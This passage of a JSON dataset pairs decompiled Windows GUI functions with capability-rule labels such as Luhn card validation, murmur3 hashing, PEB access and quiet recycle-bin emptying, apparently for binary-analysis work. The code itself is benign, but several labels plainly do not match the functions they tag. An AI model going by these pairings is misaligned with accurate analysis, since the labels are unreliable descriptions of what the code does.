        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041e5a2(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_ECX;\n    uint *arg_ch_00;\n    uint var_18h;\n    char var_10h;\n    uint var_fh;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    arg_ch_00 = 0x41e5c1;\n    fcn.0041dbbe(arg_8h, &fcn.0041e5a2::var_18h);\n    cVar1 = arg_ch >> 0x10;\n    if ((var_fh != arg_ch) || (var_10h != cVar1)) {\n        arg_ch_00 = &fcn.0041e5a2::var_18h;\n        var_10h = cVar1;\n        var_fh._0_1_ = arg_ch;\n        fcn.0041e405(arg_8h, arg_ch_00);\n        *(in_ECX + 0xa0) = 1;\n    }\n    fcn.0045e747(arg_ch_00);\n    return;\n}\n",
        "token_count": 277
    },
    "0041e8bf": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041e8bf(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint *arg_ch_00;\n    uint var_2ch;\n    uint var_18h;\n    uint var_14h;\n    uchar var_10h;\n    uint var_fh;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    fcn.0041dbbe(arg_8h, &var_18h);\n    arg_ch_00 = 0x14;\n    uVar1 = fcn.0045f3a0(&var_2ch, 0x14, &var_18h, 0x14);\n    fcn.00401000(uVar1);\n    var_14h = arg_ch;\n    var_18h = arg_14h;\n    var_fh._0_1_ = arg_10h;\n    var_10h = arg_10h >> 0x10;\n    iVar2 = fcn.00460c0e(&var_2ch, &var_18h, 0x14);\n    if (iVar2 != 0) {\n        arg_ch_00 = &var_18h;\n        fcn.0041e405(arg_8h, arg_ch_00);\n        *(in_ECX + 0xa0) = 1;\n    }\n    fcn.0045e747(arg_ch_00);\n    return;\n}\n",
        "token_count": 367
    },
    "004282f4": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.004282f4(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t *in_ECX;\n    bool bVar6;\n    uint uVar7;\n    uint lpMsg;\n    int32_t var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    int32_t var_40h;\n    int32_t iStack64;\n    int32_t iStack60;\n    int32_t iStack56;\n    int32_t lprc1;\n    int32_t iStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t *lprc2;\n    \n    iVar3 = (*_sym.imp.USER32.dll_GetCapture)();\n    if (iVar3 == 0) {\n        fcn.00432b33();\n        piVar1 = in_ECX + 2;\n        var_1ch = in_ECX[4] - *piVar1;\n        var_20h = in_ECX[5] - in_ECX[3];\n        lprc2 = piVar1;\n        uVar4 = (*_sym.imp.USER32.dll_SetCapture)(*(arg_ch + 0x20));\n        fcn.004185c5(uVar4);\n        pcVar2 = _sym.imp.USER32.dll_UpdateWindow;\n        (*_sym.imp.USER32.dll_UpdateWindow)(*(arg_ch + 0x20));\n        if (arg_18h != 0) {\n            (*pcVar2)(*(arg_18h + 0x20));\n        }\n        var_40h = *piVar1;\n        iStack64 = in_ECX[3];\n        iStack60 = in_ECX[4];\n        iStack56 = in_ECX[5];\n        fcn.00427db5(arg_8h, &var_14h, &var_18h, &var_ch, &var_10h);\n        var_ch = arg_10h - var_ch;\n        var_10h = arg_14h - var_10h;\n        if (arg_18h == 0) {\n            uVar4 = (*_sym.imp.USER32.dll_GetDC)(*(arg_ch + 0x20));\n        }\n        else {\n            uVar4 = (*_sym.imp.USER32.dll_GetDCEx)(*(arg_18h + 0x20), 0, 2);\n        }\n        iVar3 = fcn.0042e163(uVar4);\n        if (iVar3 == 0) {\n            fcn.00411e42();\n        }\n        var_8h = 0;\n        do {\n            while( true ) {\n                (*_sym.imp.USER32.dll_GetMessageA)(&lpMsg, 0, 0, 0);\n                uVar4 = (*_sym.imp.USER32.dll_GetCapture)();\n                iVar5 = fcn.004185c5(uVar4);\n                if (iVar5 != arg_ch) goto code_r0x00428528;\n                if (var_58h == 0x100) break;\n                if ((var_58h == 0x200) || (var_58h == 0x202)) {\n                    lprc1 = *lprc2;\n                    iStack48 = lprc2[1];\n                    iStack44 = lprc2[2];\n                    iStack40 = lprc2[3];\n                    if (var_14h != NULL) {\n                        *var_14h = var_50h - var_ch;\n                    }\n                    if (var_18h != NULL) {\n                        *var_18h = (var_50h >> 0x10) - var_10h;\n                    }\n                    if (arg_8h == 8) {\n                        in_ECX[4] = *lprc2 + var_1ch;\n                        in_ECX[5] = in_ECX[3] + var_20h;\n                    }\n                    (**(*in_ECX + 4))(arg_8h, lprc2);\n                    in_ECX[0x11] = var_58h == 0x202;\n                    iVar5 = (*_sym.imp.USER32.dll_EqualRect)(&lprc1, lprc2);\n                    if ((iVar5 == 0) || (in_ECX[0x11] != 0)) {\n                        if (var_8h != 0) {\n                            in_ECX[0x10] = 1;\n                            (***in_ECX)(&lprc1, arg_18h, iVar3, arg_ch);\n                        }\n                        (**(*in_ECX + 8))(&lprc1);\n                        if (var_58h != 0x202) {\n                            var_8h = 1;\n                        }\n                        if (in_ECX[0x11] != 0) goto code_r0x00428528;\n                    }\n                    iVar5 = (*_sym.imp.USER32.dll_EqualRect)(&lprc1, lprc2);\n                    if (iVar5 == 0) {\n                        in_ECX[0x10] = 0;\n                        (***in_ECX)(lprc2, arg_18h, iVar3, arg_ch);\n                    }\n                }\n                else {\n                    if (var_58h == 0x204) goto code_r0x004284fc;\n                    (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n                }\n            }\n        } while (var_54h != 0x1b);\ncode_r0x004284fc:\n        if (var_8h != 0) {\n            in_ECX[0x11] = 1;\n            in_ECX[0x10] = 1;\n            (***in_ECX)(lprc2, arg_18h, iVar3, arg_ch);\n        }\n        *lprc2 = var_40h;\n        lprc2[1] = iStack64;\n        lprc2[2] = iStack60;\n        lprc2[3] = iStack56;\ncode_r0x00428528:\n        if (arg_18h == 0) {\n            uVar4 = *(iVar3 + 4);\n            uVar7 = *(arg_ch + 0x20);\n        }\n        else {\n            uVar4 = *(iVar3 + 4);\n            uVar7 = *(arg_18h + 0x20);\n        }\n        (*_sym.imp.USER32.dll_ReleaseDC)(uVar7, uVar4);\n        (*_sym.imp.USER32.dll_ReleaseCapture)();\n        fcn.00432da4(0);\n        if (var_8h == 0) {\n            *lprc2 = var_40h;\n            lprc2[1] = iStack64;\n            lprc2[2] = iStack60;\n            lprc2[3] = iStack56;\n        }\n        in_ECX[0x11] = 0;\n        in_ECX[0x10] = 0;\n        iVar3 = (*_sym.imp.USER32.dll_EqualRect)(&var_40h, lprc2);\n        bVar6 = iVar3 == 0;\n    }\n    else {\n        bVar6 = false;\n    }\n    return bVar6;\n}\n",
        "token_count": 1735
    },
    "004311ba": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004311ba(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint *arg_18h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    int32_t lptm;\n    int32_t var_84h;\n    int32_t var_5ch;\n    uint *var_54h;\n    uint var_50h;\n    int32_t var_4ch;\n    uint32_t var_48h;\n    uint hdc;\n    int32_t var_40h;\n    uint var_30h;\n    uint var_29h;\n    uint var_24h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    var_54h = arg_18h;\n    hdc = (*_sym.imp.USER32.dll_GetDC)(0);\n    fcn.00462290(&var_40h, 0, 0x3c);\n    uVar4 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(hdc, 0x5a, 0x48);\n    pcVar2 = _sym.imp.KERNEL32.dll_MulDiv;\n    var_40h = (*_sym.imp.KERNEL32.dll_MulDiv)(arg_ch, uVar4);\n    var_40h = -var_40h;\n    var_30h = 400;\n    var_29h._0_1_ = 1;\n    uVar4 = fcn.004628b9(&var_24h, 0x20, arg_8h, 0xffffffff);\n    fcn.00401000(uVar4);\n    var_4ch = (*_sym.imp.GDI32.dll_CreateFontIndirectA)(&var_40h);\n    pcVar3 = _sym.imp.USER32.dll_GetDialogBaseUnits;\n    pcVar1 = _sym.imp.GDI32.dll_SelectObject;\n    if (var_4ch == 0) {\n        var_48h = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n        var_48h = var_48h & 0xffff;\n        uVar5 = (*pcVar3)();\n        uVar5 = uVar5 >> 0x10;\n    }\n    else {\n        var_50h = (*_sym.imp.GDI32.dll_SelectObject)(hdc, var_4ch);\n        (*_sym.imp.GDI32.dll_GetTextMetricsA)(hdc, &lptm);\n        uVar5 = var_84h + lptm;\n        (*_sym.imp.GDI32.dll_GetTextExtentPoint32A)\n                  (hdc, \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\", 0x34, &var_5ch);\n        var_48h = (var_5ch + 0x1a) / 0x34;\n        (*pcVar1)(hdc, var_50h);\n        (*_sym.imp.GDI32.dll_DeleteObject)(var_4ch);\n        arg_18h = var_54h;\n    }\n    (*_sym.imp.USER32.dll_ReleaseDC)(0, hdc);\n    uVar4 = (*pcVar2)(arg_10h, var_48h, 4);\n    *arg_18h = uVar4;\n    uVar4 = (*pcVar2)(arg_14h, uVar5, 8);\n    arg_18h[1] = uVar4;\n    fcn.0045e747(arg_10h);\n    return;\n}\n",
        "token_count": 803
    },
    "0044c5c4": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044c5c4(int32_t arg_8h, uint32_t arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    \n    if (arg_8h == 0) {\n        uVar2 = 0;\n    }\n    else {\n        iVar3 = fcn.00430e98(0x411e5c);\n        if (iVar3 == 0) {\n            fcn.00411e42();\n        }\n        if ((*(iVar3 + 0x18) != 0) && (iVar4 = fcn.004185ec(arg_8h),  iVar4 == 0)) {\n            fcn.00419592(arg_8h);\n            *(iVar3 + 0x18) = 0;\n        }\n        pcVar1 = _sym.imp.USER32.dll_RegisterWindowMessageA;\n        if (arg_ch == 0x110) {\n            *0x4bb688 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(\"commdlg_LBSelChangedNotify\");\n            *0x4bb68c = (*pcVar1)(\"commdlg_ShareViolation\");\n            *0x4bb690 = (*pcVar1)(\"commdlg_FileNameOK\");\n            *0x4bb694 = (*pcVar1)(\"commdlg_ColorOK\");\n            *0x4bb698 = (*pcVar1)(\"commdlg_help\");\n            *0x4bb69c = (*pcVar1)(\"commdlg_SetRGBColor\");\n            uVar2 = fcn.004120a6(arg_8h, 0x110, arg_10h, arg_14h);\n        }\n        else if ((arg_ch == *0x4bb698) || ((arg_ch == 0x111 && (arg_10h == 0x40e)))) {\n            (*_sym.imp.USER32.dll_SendMessageA)(arg_8h, 0x111, 0xe146, 0);\n            uVar2 = 1;\n        }\n        else {\n            if (((0xbfff < arg_ch) && (piVar5 = fcn.004185ec(arg_8h),  piVar5 != NULL)) &&\n               ((iVar3 = fcn.0042f538(0x4998f8),  iVar3 == 0 ||\n                (iVar3 = fcn.0044808e(),  (*(iVar3 + 0x34) & 0x80000) == 0)))) {\n                if (arg_ch == *0x4bb68c) {\n                    uVar2 = (**(*piVar5 + 0x15c))(arg_14h);\n                    return uVar2;\n                }\n                if (arg_ch == *0x4bb690) {\n                    piVar5[0x71] = arg_14h;\n                    uVar2 = (**(*piVar5 + 0x160))();\n                    piVar5[0x71] = 0;\n                    return uVar2;\n                }\n                if (arg_ch == *0x4bb688) {\n                    (**(*piVar5 + 0x164))(arg_10h, arg_14h & 0xffff, arg_14h >> 0x10);\n                }\n                else if (arg_ch == *0x4bb694) {\n                    uVar2 = (**(*piVar5 + 0x15c))();\n                    return uVar2;\n                }\n            }\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 805
    },
    "00471100": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint32_t * fcn.00471100(uint32_t *param_1, char param_2)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    \n    uVar1 = param_1 & 3;\n    while (uVar1 != 0) {\n        if (*param_1 == param_2) {\n            return param_1;\n        }\n        if (*param_1 == '\\0') {\n            return NULL;\n        }\n        uVar1 = param_1 + 1 & 3;\n        param_1 = param_1 + 1;\n    }\n    while( true ) {\n        while( true ) {\n            uVar1 = *param_1;\n            uVar4 = uVar1 ^ CONCAT22(CONCAT11(param_2, param_2), CONCAT11(param_2, param_2));\n            uVar3 = uVar1 ^ 0xffffffff ^ uVar1 + 0x7efefeff;\n            puVar5 = param_1 + 1;\n            if (((uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff) & 0x81010100) != 0) break;\n            param_1 = puVar5;\n            if ((uVar3 & 0x81010100) != 0) {\n                if ((uVar3 & 0x1010100) != 0) {\n                    return NULL;\n                }\n                if ((uVar1 + 0x7efefeff & 0x80000000) == 0) {\n                    return NULL;\n                }\n            }\n        }\n        uVar1 = *param_1;\n        if (uVar1 == param_2) {\n            return param_1;\n        }\n        if (uVar1 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar1 >> 8;\n        if (cVar2 == param_2) {\n            return param_1 + 1;\n        }\n        if (cVar2 == '\\0') break;\n        cVar2 = uVar1 >> 0x10;\n        if (cVar2 == param_2) {\n            return param_1 + 2;\n        }\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar1 >> 0x18;\n        if (cVar2 == param_2) {\n            return param_1 + 3;\n        }\n        param_1 = puVar5;\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 590
    },
    "00413af1": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00413af1(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint var_64h;\n    uint lpExistingFileName;\n    uint lpNewFileName;\n    uint var_58h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_4h;\n    \n    fcn.00462818(0x5c);\n    piVar1 = *(unaff_EBP + 0xc);\n    piVar2 = *(unaff_EBP + 0x10);\n    if (*piVar1 == 0) {\n        iVar4 = *piVar2;\n        if (iVar4 == 1) {\ncode_r0x00413b3b:\n            *piVar1 = iVar4;\n        }\n        else {\n            if (iVar4 == 2) {\n                *piVar1 = 2;\n                iVar4 = piVar2[1];\n                if (iVar4 == 0) {\n                    iVar4 = fcn.00411e42();\n                }\n                iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar4);\n                *(unaff_EBP + -0x60) = iVar4;\n                iVar4 = fcn.004130f7(iVar4 + 1, 2);\n                piVar1[1] = iVar4;\n                if (iVar4 != 0) {\n                    iVar5 = *(unaff_EBP + -0x60) * 2 + 2;\n                    fcn.0041314e(iVar4, iVar5, piVar2[1], iVar5);\n                }\n                goto code_r0x00413d6a;\n            }\n            if (iVar4 == 4) {\n                piVar2 = piVar2[1];\n                piVar1[1] = piVar2;\n                (**(*piVar2 + 4))(piVar2);\n                *piVar1 = 4;\n                goto code_r0x00413d6a;\n            }\n            if (iVar4 == 8) {\n                piVar2 = piVar2[1];\n                piVar1[1] = piVar2;\n                (**(*piVar2 + 4))(piVar2);\n                *piVar1 = 8;\n                goto code_r0x00413d6a;\n            }\n            if (iVar4 != 0x10) {\n                if (iVar4 == 0x20) {\n                    iVar4 = fcn.004132f5(0, piVar2[1]);\n                    *(unaff_EBP + -0x5c) = iVar4;\n                    if (iVar4 != 0) {\n                        iVar4 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar4);\n                        iVar5 = (*_sym.imp.GDI32.dll_CopyMetaFileA)(*(iVar4 + 0xc), 0);\n                        *(iVar4 + 0xc) = iVar5;\n                        if (iVar5 == 0) {\n                            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*(unaff_EBP + -0x5c));\n                            (*_sym.imp.KERNEL32.dll_GlobalFree)(*(unaff_EBP + -0x5c));\n                        }\n                        else {\n                            iVar4 = *(unaff_EBP + -0x5c);\n                            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(iVar4);\n                            piVar1[1] = iVar4;\n                            *piVar1 = 0x20;\n                        }\n                    }\n                    goto code_r0x00413d6a;\n                }\n                if (iVar4 != 0x40) goto code_r0x00413d6a;\n                goto code_r0x00413b3b;\n            }\n            *piVar1 = 0x10;\n        }\n        piVar1[1] = 0;\n    }\n    iVar4 = *piVar2;\n    if (iVar4 == 1) {\n        iVar4 = fcn.004132f5(piVar1[1], piVar2[1]);\n        if (iVar4 != 0) {\n            piVar1[1] = iVar4;\n        }\n    }\n    else if (iVar4 == 2) {\n        fcn.00413a89(piVar1[1]);\n        iVar4 = piVar1[1];\n        *(unaff_EBP + -4) = 0;\n        fcn.00413a89(iVar4);\n        (*_sym.imp.KERNEL32.dll_CopyFileA)\n                  (-(piVar2[1] != 0) & *(unaff_EBP + -0x60), -(piVar1[1] != 0) & *(unaff_EBP + -0x5c), 0);\n        fcn.00402740();\n        fcn.00402740();\n    }\n    else if (iVar4 == 4) {\n        iVar4 = (**(*piVar2[1] + 0x30))(piVar2[1], unaff_EBP + -0x58, 1);\n        if (iVar4 == 0) {\n            piVar3 = piVar1[1];\n            iVar4 = *piVar3;\n            *(unaff_EBP + -100) = 0;\n            (**(iVar4 + 0x14))(piVar3, 0, 0, 0, 0);\n            (**(*piVar2[1] + 0x14))(piVar2[1], 0, 0, 0, 0);\n            iVar4 = (**(*piVar2[1] + 0x1c))(piVar2[1], piVar1[1], *(unaff_EBP + -0x50), *(unaff_EBP + -0x4c), 0, 0);\n            if (iVar4 == 0) {\n                (**(*piVar1[1] + 0x14))(piVar1[1], 0, 0, 0, 0);\n                (**(*piVar2[1] + 0x14))(piVar2[1], 0, 0, 0, 0);\n            }\n        }\n    }\n    else if (iVar4 == 8) {\n        (**(*piVar2[1] + 0x1c))(piVar2[1], 0, 0, 0, piVar1[1]);\n    }\n    else if (((iVar4 == 0x10) || (iVar4 == 0x40)) && (piVar1[1] == 0)) {\n        iVar4 = (*_sym.imp.ole32.dll_OleDuplicateData)(piVar2[1], *(unaff_EBP + 8), 0);\n        piVar1[1] = iVar4;\n    }\ncode_r0x00413d6a:\n    fcn.0046289b();\n    return;\n}\n",
        "token_count": 1559
    },
    "0041a920": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nbool __cdecl\nfcn.0041a920(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint arg_30h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    bool bVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_10h != 0) {\n        iVar1 = fcn.00433033(arg_10h, 0xffffffff);\n        if (iVar1 == 0) {\n            fcn.00411e42();\n        }\n    }\n    var_4h = arg_8h;\n    var_8h = arg_ch;\n    var_10h = arg_14h;\n    var_14h = arg_18h;\n    var_18h = arg_1ch;\n    var_1ch = arg_20h;\n    var_20h = arg_24h;\n    var_24h = arg_28h;\n    var_ch = arg_10h;\n    var_28h = arg_2ch;\n    iVar1 = fcn.0043026e();\n    var_2ch = *(iVar1 + 8);\n    var_30h = arg_30h;\n    iVar1 = (**(*in_ECX + 100))(&var_30h);\n    if (iVar1 == 0) {\n        (**(*in_ECX + 0x114))();\n        bVar3 = false;\n    }\n    else {\n        fcn.0041a8cb();\n        iVar1 = fcn.00416acc(var_4h, var_8h, var_ch, var_10h, var_14h, var_18h, var_1ch, var_20h, var_24h, var_28h, \n                             var_2ch, var_30h);\n        iVar2 = fcn.0041866d();\n        if (iVar2 == 0) {\n            (**(*in_ECX + 0x114))();\n        }\n        bVar3 = iVar1 != 0;\n    }\n    return bVar3;\n}\n",
        "token_count": 581
    },
    "0044949b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044949b(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_ECX;\n    uint var_30h;\n    \n    fcn.0044930c(&var_30h, arg_8h, arg_ch);\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x405, 0, &var_30h);\n    return;\n}\n",
        "token_count": 100
    },
    "004494fe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004494fe(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    uint var_30h;\n    uint var_20h;\n    \n    fcn.0044930c(&var_30h, arg_8h, arg_ch);\n    uVar1 = fcn.0045f3a0(&var_20h, 0x10, arg_10h, 0x10);\n    fcn.00401000(uVar1);\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x406, 0, &var_30h);\n    return;\n}\n",
        "token_count": 164
    },
    "0044cbe9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044cbe9(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t in_ECX;\n    uint var_30h;\n    uint var_2ch;\n    uint var_10h;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    piVar2 = fcn.00431b02(*(in_ECX + 0x24), 0x49fb08);\n    if (piVar2 != NULL) {\n        iVar3 = (**(*piVar2 + 0x14))(piVar2, &var_4h);\n        if ((iVar3 == 0) && (var_4h != NULL)) {\n            piVar4 = fcn.00431b02(*(in_ECX + 0x24), 0x4a0ff8);\n            iVar3 = (**(*var_4h + 0xc))(var_4h, 1, &var_30h, 0);\n            pcVar1 = _sym.imp.ole32.dll_CoTaskMemFree;\n            while (iVar3 == 0) {\n                iVar3 = (**(*piVar4 + 0xc))(piVar4, &var_30h, &var_10h);\n                if (iVar3 == 0) {\n                    if (var_8h != 0) {\n                        (*_sym.imp.ole32.dll_ReleaseStgMedium)(&var_10h);\n                        goto code_r0x0044cc71;\n                    }\n                    fcn.00453f6a(0, &var_10h, &var_30h);\n                }\n                else {\ncode_r0x0044cc71:\n                    (*pcVar1)(var_2ch);\n                }\n                iVar3 = (**(*var_4h + 0xc))(var_4h, 1, &var_30h, 0);\n            }\n            (**(*var_4h + 8))(var_4h);\n            (**(*piVar4 + 8))(piVar4);\n        }\n        (**(*piVar2 + 8))(piVar2);\n    }\n    return;\n}\n",
        "token_count": 496
    },
    "0042692e": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nint32_t fcn.0042692e(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0042fcbb();\n    return iVar1 + 0x30;\n}\n",
        "token_count": 45
    },
    "0041fa89": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041fa89(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    if ((((param_2 != 0) && (param_2 != 6)) && (param_2 != 7)) && ((param_2 != 8 && (param_2 != 4)))) {\n        uVar1 = (*_sym.imp.USER32.dll_GetLastActivePopup)(*(param_1 + 0x20));\n        (*_sym.imp.USER32.dll_BringWindowToTop)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "0042e67f": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042e67f(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h, int32_t *arg_18h)\n\n{\n    uint16_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    uint var_40h;\n    uint var_38h;\n    uint var_30h;\n    uint var_28h;\n    uint var_20h;\n    uint var_18h;\n    uint var_10h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar1 = *(arg_10h + 4);\n    if (uVar1 < 0x20c) {\n        if (uVar1 == 0x20b) {\n            fcn.0042dc0d(&var_10h, *(arg_10h + 8), *(arg_10h + 6));\n            return 1;\n        }\n        if (uVar1 == 0x1e) {\n            (**(*arg_18h + 0x1c))();\n            return 1;\n        }\n        if (uVar1 == 0x103) {\n            (**(*arg_18h + 0x34))(*(arg_10h + 6));\n            return 1;\n        }\n        if (uVar1 == 0x127) {\n            (**(*arg_18h + 0x20))(*(arg_10h + 6));\n            return 1;\n        }\n        if (uVar1 == 0x12d) {\n            uVar5 = *(arg_ch + *(arg_10h + 6) * 4);\n            iVar3 = (*_sym.imp.GDI32.dll_GetObjectType)(uVar5);\n            if (iVar3 == 0) {\n                var_4h = (*_sym.imp.GDI32.dll_GetStockObject)(0xd);\n                pcVar2 = _sym.imp.GDI32.dll_SelectObject;\n                uVar4 = (*_sym.imp.GDI32.dll_SelectObject)(arg_18h[1], var_4h);\n                var_8h = (*pcVar2)(arg_18h[1], uVar5);\n                if (var_8h == var_4h) {\n                    uVar5 = fcn.0042e42a(uVar5);\n                    iVar3 = *arg_18h;\ncode_r0x0042e747:\n                    (**(iVar3 + 0x28))(uVar5);\n                    return 1;\n                }\n                (*pcVar2)(arg_18h[1], uVar4);\n                (*pcVar2)(arg_18h[1], var_8h);\n            }\n            else if (iVar3 == 6) {\n                uVar5 = fcn.0042e42a(uVar5);\n                iVar3 = *arg_18h;\n                goto code_r0x0042e747;\n            }\n        }\n        else {\n            if (uVar1 == 0x201) {\n                (**(*arg_18h + 0x2c))(*(arg_10h + 6));\n                return 1;\n            }\n            if (uVar1 == 0x209) {\n                (**(*arg_18h + 0x30))(*(arg_10h + 6));\n                return 1;\n            }\n        }\n    }\n    else {\n        if (uVar1 == 0x20c) {\n            (**(*arg_18h + 0x48))(&var_40h, *(arg_10h + 8), *(arg_10h + 6));\n            return 1;\n        }\n        if (uVar1 == 0x20d) {\n            (**(*arg_18h + 0x38))(&var_38h, *(arg_10h + 8), *(arg_10h + 6));\n            return 1;\n        }\n        if (uVar1 == 0x20e) {\n            (**(*arg_18h + 0x40))(&var_30h, *(arg_10h + 8), *(arg_10h + 6));\n            return 1;\n        }\n        if (uVar1 == 0x211) {\n            (**(*arg_18h + 0x3c))(&var_28h, *(arg_10h + 8), *(arg_10h + 6));\n            return 1;\n        }\n        if (uVar1 == 0x410) {\n            (**(*arg_18h + 0x4c))(&var_20h, *(arg_10h + 0xc), *(arg_10h + 10), *(arg_10h + 8), *(arg_10h + 6));\n            return 1;\n        }\n        if (uVar1 == 0x412) {\n            (**(*arg_18h + 0x44))(&var_18h, *(arg_10h + 0xc), *(arg_10h + 10), *(arg_10h + 8), *(arg_10h + 6));\n            return 1;\n        }\n    }\n    (*_sym.imp.GDI32.dll_PlayMetaFileRecord)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return 1;\n}\n",
        "token_count": 1185
    },
    "0041ef0d": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
